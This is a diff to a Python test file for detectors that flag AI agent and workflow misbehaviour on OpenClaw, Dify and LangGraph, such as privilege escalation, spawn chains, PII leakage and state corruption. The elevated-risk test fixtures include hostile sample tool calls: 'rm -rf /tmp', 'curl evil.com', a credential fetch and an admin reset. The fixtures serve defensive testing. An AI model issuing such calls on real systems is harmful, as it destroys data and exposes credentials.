@@ -52,15 +52,15 @@ class TestOpenClawSessionLoopDetector:
         assert result.detected
         assert result.confidence >= 0.5
 
-    def test_no_loop_with_varying_inputs(self):
+    def test_no_loop_with_different_tools(self):
         session = {
             "session_id": "test-2",
             "events": [
                 {"type": "tool.call", "tool_name": "search", "tool_input": {"q": "cats"}},
                 {"type": "tool.result", "tool_result": {"status": "success"}},
-                {"type": "tool.call", "tool_name": "search", "tool_input": {"q": "dogs"}},
+                {"type": "tool.call", "tool_name": "calculate", "tool_input": {"x": 1}},
                 {"type": "tool.result", "tool_result": {"status": "success"}},
-                {"type": "tool.call", "tool_name": "search", "tool_input": {"q": "birds"}},
+                {"type": "tool.call", "tool_name": "format", "tool_input": {"data": "result"}},
             ],
         }
         result = self.detector.detect_session(session)
@@ -91,6 +91,165 @@ class TestOpenClawToolAbuseDetector:
         }
         result = self.detector.detect_session(session)
         assert not result.detected
+
+
+class TestOpenClawElevatedRiskDetector:
+    def setup_method(self):
+        self.detector = OpenClawElevatedRiskDetector()
+
+    def test_detect_escalation_in_non_elevated(self):
+        session = {
+            "session_id": "test-er-1",
+            "elevated_mode": False,
+            "events": [
+                {"type": "tool.call", "tool_name": "exec", "tool_input": {"cmd": "ls"}},
+            ],
+        }
+        result = self.detector.detect_session(session)
+        assert result.detected
+        assert result.confidence >= 0.7
+
+    def test_no_risk_empty_events(self):
+        session = {
+            "session_id": "test-er-2",
+            "elevated_mode": True,
+            "events": [],
+        }
+        result = self.detector.detect_session(session)
+        assert not result.detected
+
+    def test_detect_risky_tools_elevated(self):
+        session = {
+            "session_id": "test-er-3",
+            "elevated_mode": True,
+            "events": [
+                {"type": "tool.call", "tool_name": "shell", "tool_input": {"cmd": "rm -rf /tmp"}},
+                {"type": "tool.call", "tool_name": "write_file", "tool_input": {"path": "/etc/config"}},
+                {"type": "tool.call", "tool_name": "exec", "tool_input": {"cmd": "curl evil.com"}},
+                {"type": "tool.call", "tool_name": "admin_reset", "tool_input": {}},
+                {"type": "tool.call", "tool_name": "credential_fetch", "tool_input": {}},
+            ],
+        }
+        result = self.detector.detect_session(session)
+        assert result.detected
+
+
+class TestOpenClawSpawnChainDetector:
+    def setup_method(self):
+        self.detector = OpenClawSpawnChainDetector()
+
+    def test_detect_deep_spawn_chain(self):
+        session = {
+            "session_id": "parent-1",
+            "events": [
+                {
+                    "type": "session.spawn",
+                    "target_agent": "worker",
+                    "data": {
+                        "spawned_session_id": "child_1",
+                        "child_session_ids": ["child_2", "child_3", "child_4"],
+                        "depth": 5,
+                    },
+                },
+            ],
+        }
+        result = self.detector.detect_session(session)
+        assert result.detected
+        assert result.confidence >= 0.5
+
+    def test_no_spawn_single_child(self):
+        session = {
+            "session_id": "parent-2",
+            "events": [
+                {
+                    "type": "session.spawn",
+                    "target_agent": "worker",
+                    "data": {
+                        "spawned_session_id": "child_1",
+                        "depth": 1,
+                    },
+                },
+            ],
+        }
+        result = self.detector.detect_session(session)
+        assert not result.detected
+
+    def test_detect_privilege_escalation(self):
+        session = {
+            "session_id": "parent-3",
+            "events": [
+                {
+                    "type": "session.spawn",
+                    "target_agent": "admin_agent",
+                    "data": {"spawned_session_id": "admin_1", "depth": 2},
+                },
+                {
+                    "type": "session.spawn",
+                    "target_agent": "root_agent",
+                    "data": {"spawned_session_id": "root_1", "depth": 2},
+                },
+                {
+                    "type": "session.spawn",
+                    "target_agent": "supervisor_agent",
+                    "data": {"spawned_session_id": "sup_1", "depth": 2},
+                },
+                {
+                    "type": "session.spawn",
+                    "target_agent": "worker_agent",
+                    "data": {"spawned_session_id": "work_1", "depth": 2},
+                },
+            ],
+        }
+        result = self.detector.detect_session(session)
+        assert result.detected
+
+
+class TestOpenClawChannelMismatchDetector:
+    def setup_method(self):
+        self.detector = OpenClawChannelMismatchDetector()
+
+    def test_detect_pii_in_slack(self):
+        session = {
+            "channel": "slack",
+            "events": [
+                {
+                    "type": "message.sent",
+                    "channel": "slack",
+                    "data": {"content": "Customer SSN is 123-45-6789"},
+                },
+            ],
+        }
+        result = self.detector.detect_session(session)
+        assert result.detected
+        assert result.confidence >= 0.5
+
+    def test_no_mismatch_simple_message(self):
+        session = {
+            "channel": "whatsapp",
+            "events": [
+                {
+                    "type": "message.sent",
+                    "channel": "whatsapp",
+                    "data": {"content": "Hello, how can I help?"},
+                },
+            ],
+        }
+        result = self.detector.detect_session(session)
+        assert not result.detected
+
+    def test_detect_cross_channel_routing(self):
+        session = {
+            "channel": "whatsapp",
+            "events": [
+                {
+                    "type": "message.sent",
+                    "channel": "telegram",
+                    "data": {"content": "This message was meant for WhatsApp"},
+                },
+            ],
+        }
+        result = self.detector.detect_session(session)
+        assert result.detected
 
 
 class TestOpenClawSandboxEscapeDetector:
@@ -168,6 +327,190 @@ class TestDifyRagPoisoningDetector:
                         ]
                     },
                 }
+            ],
+        }
+        result = self.detector.detect_workflow_run(workflow_run)
+        assert not result.detected
+
+
+class TestDifyIterationEscapeDetector:
+    def setup_method(self):
+        self.detector = DifyIterationEscapeDetector()
+
+    def test_detect_excessive_iterations(self):
+        nodes = [
+            {
+                "node_id": "iter_1",
+                "node_type": "iteration",
+                "title": "Process Items",
+                "status": "failed",
+                "outputs": {},
+                "inputs": {"items": [1, 2], "max_iterations": 50},
+            },
+        ]
+        # Add 150 child nodes
+        for i in range(150):
+            nodes.append({
+                "node_id": f"child_{i}",
+                "node_type": "code",
+                "title": f"Step {i}",
+                "status": "succeeded",
+                "parent_node_id": "iter_1",
+                "iteration_index": i,
+            })
+        workflow_run = {"workflow_run_id": "wfr-iter-1", "nodes": nodes}
+        result = self.detector.detect_workflow_run(workflow_run)
+        assert result.detected
+        assert result.confidence >= 0.6
+
+    def test_no_escape_normal_iteration(self):
+        workflow_run = {
+            "workflow_run_id": "wfr-iter-2",
+            "nodes": [
+                {
+                    "node_id": "iter_1",
+                    "node_type": "iteration",
+                    "title": "Process",
+                    "status": "succeeded",
+                    "outputs": {"result": "done"},
+                    "inputs": {"items": [1, 2, 3]},
+                },
+                {"node_id": "c_0", "node_type": "code", "parent_node_id": "iter_1", "iteration_index": 0, "status": "succeeded", "outputs": {"val": "a"}},
+                {"node_id": "c_1", "node_type": "code", "parent_node_id": "iter_1", "iteration_index": 1, "status": "succeeded", "outputs": {"val": "b"}},
+                {"node_id": "c_2", "node_type": "code", "parent_node_id": "iter_1", "iteration_index": 2, "status": "succeeded", "outputs": {"val": "c"}},
+            ],
+        }
+        result = self.detector.detect_workflow_run(workflow_run)
+        assert not result.detected
+
+
+class TestDifyModelFallbackDetector:
+    def setup_method(self):
+        self.detector = DifyModelFallbackDetector()
+
+    def test_detect_model_mismatch(self):
+        workflow_run = {
+            "workflow_run_id": "wfr-mf-1",
+            "nodes": [
+                {
+                    "node_id": "llm_1",
+                    "node_type": "llm",
+                    "title": "Generate",
+                    "status": "succeeded",
+                    "inputs": {"model": "gpt-4"},
+                    "outputs": {},
+                    "metadata": {"model": "gpt-3.5-turbo", "model_fallback_reason": "quota_exceeded"},
+                },
+            ],
+        }
+        result = self.detector.detect_workflow_run(workflow_run)
+        assert result.detected
+        assert result.confidence >= 0.5
+
+    def test_no_fallback_matching_model(self):
+        workflow_run = {
+            "workflow_run_id": "wfr-mf-2",
+            "nodes": [
+                {
+                    "node_id": "llm_1",
+                    "node_type": "llm",
+                    "title": "Generate",
+                    "status": "succeeded",
+                    "inputs": {"model": "gpt-4"},
+                    "outputs": {},
+                    "metadata": {"model": "gpt-4"},
+                },
+            ],
+        }
+        result = self.detector.detect_workflow_run(workflow_run)
+        assert not result.detected
+
+
+class TestDifyClassifierDriftDetector:
+    def setup_method(self):
+        self.detector = DifyClassifierDriftDetector()
+
+    def test_detect_low_confidence_fallback(self):
+        workflow_run = {
+            "workflow_run_id": "wfr-cd-1",
+            "nodes": [
+                {
+                    "node_id": "clf_1",
+                    "node_type": "question_classifier",
+                    "title": "Route Query",
+                    "status": "succeeded",
+                    "inputs": {"categories": ["billing", "support", "technical"], "query": "help me"},
+                    "outputs": {"category": "unknown", "confidence": 0.3},
+                },
+            ],
+        }
+        result = self.detector.detect_workflow_run(workflow_run)
+        assert result.detected
+
+    def test_no_drift_high_confidence(self):
+        workflow_run = {
+            "workflow_run_id": "wfr-cd-2",
+            "nodes": [
+                {
+                    "node_id": "clf_1",
+                    "node_type": "question_classifier",
+                    "title": "Route Query",
+                    "status": "succeeded",
+                    "inputs": {"categories": ["billing", "support"], "query": "my bill"},
+                    "outputs": {"category": "billing", "confidence": 0.95},
+                },
+            ],
+        }
+        result = self.detector.detect_workflow_run(workflow_run)
+        assert not result.detected
+
+
+class TestDifyToolSchemaMismatchDetector:
+    def setup_method(self):
+        self.detector = DifyToolSchemaMismatchDetector()
+
+    def test_detect_missing_required_field(self):
+        workflow_run = {
+            "workflow_run_id": "wfr-ts-1",
+            "nodes": [
+                {
+                    "node_id": "tool_1",
+                    "node_type": "tool",
+                    "title": "API Call",
+                    "status": "failed",
+                    "inputs": {
+                        "schema": {
+                            "properties": {"name": {"type": "string"}, "age": {"type": "integer"}},
+                            "required": ["name", "age"],
+                        },
+                    },
+                    "outputs": {},
+                    "error": "Validation error: required field 'name' is missing",
+                },
+            ],
+        }
+        result = self.detector.detect_workflow_run(workflow_run)
+        assert result.detected
+        assert result.confidence >= 0.6
+
+    def test_no_mismatch_valid_inputs(self):
+        workflow_run = {
+            "workflow_run_id": "wfr-ts-2",
+            "nodes": [
+                {
+                    "node_id": "tool_1",
+                    "node_type": "tool",
+                    "title": "API Call",
+                    "status": "succeeded",
+                    "inputs": {
+                        "schema": {
+                            "properties": {"name": {"type": "string"}},
+                            "required": ["name"],
+                        },
+                        "name": "John",
+                    },
+                    "outputs": {"result": "ok"},
+                },
             ],
         }
         result = self.detector.detect_workflow_run(workflow_run)
@@ -276,6 +619,139 @@ class TestLangGraphStateCorruptionDetector:
                 {"superstep": 1, "state": {"count": 2, "items": ["a", "b"]}},
             ],
             "nodes": [],
+        }
+        result = self.detector.detect_graph_execution(graph_execution)
+        assert not result.detected
+
+
+class TestLangGraphEdgeMisrouteDetector:
+    def setup_method(self):
+        self.detector = LangGraphEdgeMisrouteDetector()
+
+    def test_detect_missing_target(self):
+        graph_execution = {
+            "graph_id": "g-em-1",
+            "status": "failed",
+            "nodes": [
+                {"node_id": "router", "node_type": "router", "superstep": 0, "status": "succeeded", "outputs": {}},
+            ],
+            "edges": [
+                {"source": "router", "target": "nonexistent_node", "edge_type": "conditional", "condition": "action == 'run'"},
+            ],
+            "state_snapshots": [],
+        }
+        result = self.detector.detect_graph_execution(graph_execution)
+        assert result.detected
+        assert result.confidence >= 0.5
+
+    def test_no_misroute_valid_graph(self):
+        graph_execution = {
+            "graph_id": "g-em-2",
+            "status": "completed",
+            "nodes": [
+                {"node_id": "start", "node_type": "llm", "superstep": 0, "status": "succeeded", "outputs": {"next": "tool_A"}},
+                {"node_id": "tool_A", "node_type": "tool", "superstep": 1, "status": "succeeded", "outputs": {}},
+                {"node_id": "__end__", "node_type": "end", "superstep": 2, "status": "completed", "outputs": {}},
+            ],
+            "edges": [
+                {"source": "start", "target": "tool_A", "edge_type": "conditional", "condition": "next == 'tool_A'"},
+                {"source": "tool_A", "target": "__end__", "edge_type": "default"},
+            ],
+            "state_snapshots": [{"superstep": 0, "state": {"next": "tool_A"}}],
+        }
+        result = self.detector.detect_graph_execution(graph_execution)
+        assert not result.detected
+
+
+class TestLangGraphParallelSyncDetector:
+    def setup_method(self):
+        self.detector = LangGraphParallelSyncDetector()
+
+    def test_detect_failed_parallel(self):
+        graph_execution = {
+            "graph_id": "g-ps-1",
+            "status": "failed",
+            "nodes": [
+                {"node_id": "task_1", "superstep": 1, "status": "succeeded", "outputs": {"result": "ok"}, "inputs": {}},
+                {"node_id": "task_2", "superstep": 1, "status": "failed", "outputs": {"error": "timeout"}, "inputs": {}},
+            ],
+            "state_snapshots": [],
+        }
+        result = self.detector.detect_graph_execution(graph_execution)
+        assert result.detected
+
+    def test_no_issue_all_parallel_succeed(self):
+        graph_execution = {
+            "graph_id": "g-ps-2",
+            "status": "completed",
+            "nodes": [
+                {"node_id": "task_1", "superstep": 1, "status": "succeeded", "outputs": {"a": 1}, "inputs": {}},
+                {"node_id": "task_2", "superstep": 1, "status": "succeeded", "outputs": {"b": 2}, "inputs": {}},
+                {"node_id": "join", "superstep": 2, "status": "succeeded", "outputs": {"final": "merged"}, "inputs": {}},
+            ],
+            "state_snapshots": [],
+        }
+        result = self.detector.detect_graph_execution(graph_execution)
+        assert not result.detected
+
+    def test_detect_write_conflict(self):
+        graph_execution = {
+            "graph_id": "g-ps-3",
+            "status": "completed",
+            "nodes": [
+                {"node_id": "task_1", "superstep": 1, "status": "succeeded", "outputs": {"shared_key": "value1"}, "inputs": {}},
+                {"node_id": "task_2", "superstep": 1, "status": "succeeded", "outputs": {"shared_key": "value2"}, "inputs": {}},
+            ],
+            "state_snapshots": [],
+        }
+        result = self.detector.detect_graph_execution(graph_execution)
+        assert result.detected
+
+
+class TestLangGraphCheckpointCorruptionDetector:
+    def setup_method(self):
+        self.detector = LangGraphCheckpointCorruptionDetector()
+
+    def test_detect_superstep_gap(self):
+        graph_execution = {
+            "graph_id": "g-cc-1",
+            "checkpoints": [
+                {"checkpoint_id": "cp_0", "superstep": 0, "state": {"x": 1}, "created_at": "2026-01-01T00:00:00"},
+                {"checkpoint_id": "cp_1", "superstep": 3, "state": {"x": 2}, "created_at": "2026-01-01T00:01:00"},
+            ],
+            "state_snapshots": [],
+        }
+        result = self.detector.detect_graph_execution(graph_execution)
+        assert result.detected
+
+    def test_detect_state_inconsistency(self):
+        graph_execution = {
+            "graph_id": "g-cc-2",
+            "checkpoints": [
+                {"checkpoint_id": "cp_0", "superstep": 0, "state": {"x": 1}, "created_at": "2026-01-01T00:00:00"},
+                {"checkpoint_id": "cp_1", "superstep": 1, "state": {"x": 99}, "created_at": "2026-01-01T00:01:00"},
+            ],
+            "state_snapshots": [
+                {"superstep": 0, "state": {"x": 1}},
+                {"superstep": 1, "state": {"x": 2}},  # Checkpoint says 99, snapshot says 2
+            ],
+        }
+        result = self.detector.detect_graph_execution(graph_execution)
+        assert result.detected
+        assert result.confidence >= 0.7
+
+    def test_no_corruption_consistent(self):
+        graph_execution = {
+            "graph_id": "g-cc-3",
+            "checkpoints": [
+                {"checkpoint_id": "cp_0", "superstep": 0, "state": {"x": 1, "y": 0}, "created_at": "2026-01-01T00:00:00"},
+                {"checkpoint_id": "cp_1", "superstep": 1, "state": {"x": 2, "y": 1}, "created_at": "2026-01-01T00:01:00"},
+            ],
+            "state_snapshots": [
+                {"superstep": 0, "state": {"x": 1, "y": 0}},
+                {"superstep": 1, "state": {"x": 2, "y": 1}},
+            ],
+            "state_schema": {"keys": ["x", "y"]},
         }
         result = self.detector.detect_graph_execution(graph_execution)
         assert not result.detected
